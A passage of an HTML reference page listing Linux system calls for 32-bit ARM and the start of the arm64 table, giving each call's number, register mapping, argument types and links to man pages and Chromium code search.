href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x169</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">362</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x16a</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">363</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0x16b</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">364</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0x16c</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">365</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0x16d</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">366</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0x16e</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">367</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x16f</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">368</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x170</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">369</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x171</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">370</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x172</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">371</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x173</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">372</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x174</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">373</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x175</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">374</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x176</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">375</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x177</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">376</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x178</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">377</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x179</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">378</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x17a</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">379</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x17b</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">380</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x17c</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">381</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x17d</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">382</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x17e</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">383</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x17f</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">384</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x180</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">385</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x181</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">386</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x182</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">387</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x183</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">388</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x184</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">389</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x185</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">390</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x186</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">391</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x187</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">392</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x188</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">393</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x189</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">394</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x18a</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">395</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x18b</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">396</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x18c</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">397</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x18d</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr><tr><td align="center">983041</td><td>ARM_breakpoint</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_breakpoint.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_breakpoint">cs/</a></td><td align="center">0xf0001</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983042</td><td>ARM_cacheflush</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_cacheflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_cacheflush">cs/</a></td><td align="center">0xf0002</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983043</td><td>ARM_usr26</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_usr26.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_usr26">cs/</a></td><td align="center">0xf0003</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983044</td><td>ARM_usr32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_usr32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_usr32">cs/</a></td><td align="center">0xf0004</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983045</td><td>ARM_set_tls</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_set_tls.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_set_tls">cs/</a></td><td align="center">0xf0005</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><h1 id="0x4-arm64-64bit"><a href="#0x4-arm64-64bit" class="headerlink" title="0x4 arm64-64bit"></a>0x4 arm64-64bit</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%x8</th><th>arg0 (%x0)</th><th>arg1 (%x1)</th><th>arg2 (%x2)</th><th>arg3 (%x3)</th><th>arg4 (%x4)</th><th>arg5 (%x5)</th></tr></thead><tbody><tr><td align="center">0</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0x00</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0x01</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0x02</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0x03</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0x04</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">5</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0x05</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">6</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0x06</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">7</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0x07</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">8</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0x08</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0x09</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">10</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0x0a</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0x0b</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0x0c</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0x0d</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">14</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0x0e</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0x0f</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">16</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0x10</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0x11</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">18</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0x12</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">19</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x13</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x14</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0x15</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">22</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x16</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">23</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x17</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">24</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x18</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x19</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">26</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x1a</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0x1b</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">28</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0x1c</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">29</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x1d</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0x1e</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">31</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0x1f</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">32</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x20</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">33</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x21</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x22</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x23</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">36</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x24</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a 